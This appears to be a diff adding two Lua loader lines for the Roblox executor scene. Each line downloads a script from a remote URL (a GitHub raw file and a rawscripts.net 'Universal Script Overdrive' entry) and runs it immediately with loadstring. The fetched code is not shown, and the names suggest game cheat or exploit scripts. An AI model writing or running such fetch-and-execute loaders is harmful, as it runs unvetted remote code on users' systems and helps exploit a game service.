@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SecretGameSs/Flash/refs/heads/main/Script.io"))()
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Overdrive-H-Lite-21568"))()
